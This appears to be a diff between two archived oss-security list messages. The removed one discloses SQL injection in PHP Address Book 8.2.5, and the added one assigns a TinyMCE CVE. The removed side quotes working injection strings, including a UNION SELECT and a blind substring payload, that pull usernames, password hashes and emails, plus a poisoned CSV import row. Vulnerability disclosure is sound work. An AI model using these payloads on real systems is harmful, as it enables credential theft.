@@ -1,117 +1,53 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/10/1
-Message-ID: <CALuSjqbk9t1ojo-O9N0m2D_Da3q_u+Byz9mXK6VtDpQ3WbM9Vw@mail.gmail.com>
-Date: Fri, 10 May 2013 17:14:33 +0800
-From: Doraemon Sk8ers <doraemon.sk8ers@...il.com>
-To: Henri Salo <henri@...v.fi>
-Cc: oss-security@...ts.openwall.com
-Subject: Re: Multiple vulnerabilities in PHP Address Book v8.2.5
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/01/17/6
+Message-ID: <50F7B400.3090108@redhat.com>
+Date: Thu, 17 Jan 2013 01:19:12 -0700
+From: Kurt Seifried <kseifried@...hat.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>, Michael de Raadt <michaeld@...dle.com>
+Subject: Request for CVE Identifiers
 Content-Type: text/plain; charset=utf-8
 
-Hi Henri,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-CVE-2013-1748 #1 does seems to be similar with CVE-2008-2565, the only
-difference is the increase in the number of columns
-To our knowledge, CVE-2013-1748 #2 and #3 has not been published before
+On 01/11/2013 01:07 AM, Michael de Raadt wrote:
+> Hi, Kurt.
+> 
+> Thanks for providing those CVE identifiers.
+> 
+> In relation to the TinyMCE security issue, I couldn't find it in 
+> the list you suggested 
+> (https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=TinyMCE). The 
+> issue was in the TinyMCE Google spellchecker plugin. Here are some 
+> related links...
+> 
+> http://www.tinymce.com/develop/changelog/?type=phpspell 
+> http://www.tinymce.com/forum/viewtopic.php?id=30036
+> 
+https://github.com/tinymce/tinymce_spellchecker_php/commit/22910187bfb9edae90c26e10100d8145b505b974
+> 
+> I hope that helps.
 
-Regards
-Team Doraemon.Sk8ers
-http://doraemondroids.wikispaces.com/
+Please use CVE-2012-6112 for this issue thanks.
 
-On Wed, Apr 17, 2013 at 10:27 PM, Henri Salo <henri@...v.fi> wrote:
+- -- 
+Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
 
-> Hello,
->
-> I believe CVE-2013-1748 #1 is duplicate of CVE-2008-2565 as per OSVDB[1].
-> As far
-> as I know most of security vulnerabilities reported to this project
-> haven't been
-> fixed. Haven't verified this detail. What php-addressbook project would
-> need is
-> patches to fix all issues you can find. Finding vulnerabilities is easy -
-> fixing in upstream is not. I can help you if you are willing to write
-> patches.
-> Takes hour or two :)
->
-> 1: http://osvdb.org/45965
->
-> ---
-> Henri Salo
->
-> On Wed, Apr 17, 2013 at 11:14:27AM +0800, Doraemon Sk8ers wrote:
-> > There is a SQL injection vulnerability and reflected XSS in Simple PHP
-> > Address Book v8.2.5.
-> > The 2 vulnerabilities had been assigned the CVE identifier CVE-2013-1748
-> > (SQLi) & CVE-2013-1749 (XSS) respectively.
-> >
-> > # Software Link: http://sourceforge.net/projects/php-addressbook/
-> > # Version: v8.2.5
-> > # Tested on: v8.2.5
-> > # CVE : CVE-2013-1748 (SQLi) & CVE-2013-1749 (XSS)
-> >
-> >
-> > Details:
-> > -----------
-> > *
-> > *
-> > *CVE-2013-1748 (SQLi)*
-> >
-> > We have discovered 3 pages which are prone to SQL Injection
-> >
-> > 1.    /view.php?id=1
-> > The "id" parameter is vulnerable to SQL injection
-> > Injection Vector:
-> >       /view.php?id=-1' union select '1','2','3','4',(select username from
-> > users limit 1),(select md5_pass from users limit 1),(select email from
-> > users limit
-> 1),'8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41
-> > This injection vector will dump the username, md5 password and email
-> > of the first user in the user table onto the page itself
-> >
-> > 2.    /edit.php
-> > Most of the fields on this page are vulnerable to SQL injection
-> > Injection Vector (inclusive of quotes):
-> >       '+(select ASCII(SUBSTRING((SELECT md5_pass from users limit 1),
-> 1)))+'
-> > This will dump out the ASCII value of the 1st character of the md5
-> > password of the first user
-> >
-> > 3.    /import.php
-> > The same injection vulnerability as Point 2 above is also present in
-> > the import function
-> > Using the same injection vector, saved in a csv file
-> >       '+(select ASCII(SUBSTRING((SELECT md5_pass from users limit 1),
-> 1)))+'
-> > Similarly, this injection vector will dump out the ASCII value of the
-> > 1st character of the md5 password of the first user
-> >
-> > The original input csv sample looks like this
-> > "Last name";"First
-> > name";"Birthday";"Address";"ZIP";"City";"Home";"Mobile";"E-mail
-> > home";"Work";"Fax";"E-mail office";"Second address";"Second phone"
-> > "thelastname";"thefirstname";"13.09.1951";"Street";"1234";"city,
-> > Country";"+1 123 456 789";"+2 345 678 910";"first.last@...l1.com";"+3
-> > 456 789 101";"+4 567 897 011";"first.last@...l2.net";"second street,
-> > 1234 secondcity, secondcountry";"+5 678 910 111"
-> >
-> > The injected csv with the injected vectors looks like this
-> > "Last name";"First
-> > name";"Birthday";"Address";"ZIP";"City";"Home";"Mobile";"E-mail
-> > home";"Work";"Fax";"E-mail office";"Second address";"Second phone"
-> > "";"injectedthrucsv";"13.09.1951";"'+(select ASCII(SUBSTRING((SELECT
-> > md5_pass from users limit 1), 1)))+'";"";"city, Country";"+1 123 456
-> > 789";"+2 345 678 910";"first.last@...l1.com";"+3 456 789 101";"+4 567
-> > 897 011";"first.last@...l2.net";"second street, 1234 secondcity,
-> > secondcountry";"+5 678 910 111"
-> <snip>
->
-> -----BEGIN PGP SIGNATURE-----
-> Version: GnuPG v1.4.10 (GNU/Linux)
->
-> iEYEARECAAYFAlFusWEACgkQXf6hBi6kbk+zewCgv1NZPnNJ+oullyyNGCZIiZDE
-> yVgAn0B3sIciT45IzHOQgAhZpEl+ul0p
-> =c0zL
-> -----END PGP SIGNATURE-----
->
->
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.12 (GNU/Linux)
 
+iQIcBAEBAgAGBQJQ97QAAAoJEBYNRVNeJnmTe2kP/1Yla3okNRjv2VkjcAmcltJL
+Cgh46+lWh3RcYg7qzQvYagZMnQiLiVNdLIMTXST7WdZ3ADBmO76ZxZNgpee5RG9i
+KQce10xw/q6/KBrEm/qmsClWRL8oGRYkqTgnmeja3xKnglUHo0v9gXiHSQ6+OBl3
+cW8YzU58aatUodEYZ7rHIL03N5ND3zvgkDt5djF1rpoJeuWOmwkFz1sIpm5b3mlM
+KV2vdaDlQs5KV/MQNbyRpS51QRW1TzIlm3SzSCFCC5aw5ZUM5vbx30oQAaoYJmw5
+TPEo9IYikebm+lqvRBcSnSRCGtIDzlYZd5S7MgAUNCDJxRuMkiTXId6+kpoUfQYm
+ZjHnX/vPH4I7uvSMcwXFr6m/oy1SzzDC/Dfd1wXhVpAA4TZUYd2rUMVdhrfQetUR
+ptCbUg3MucchagWQnjVVU9NsM40iUSUc8UT1tRU67gd+jWUXPmF9ZFlyMnw55NVJ
+syeOzZsJaolvaZLYcNa+09VmSttO/Ytuvp4qMADynOVsvk2U1DLzHNrKzp/b0lCi
+djhyyimi3inQbrodbp5oEo57iKcKbkq6mfCAh2y7+TTwPcJrh8SHfQFG2Jy5rX1D
+/7xQITzCRgLA862MeWaYOUn0+rscdFKzH0sJgB0up40QrfC6hKCJkdPv7rgeKZqt
+W8BW9S3cwa5ge254xhN1
+=RBMX
+-----END PGP SIGNATURE-----
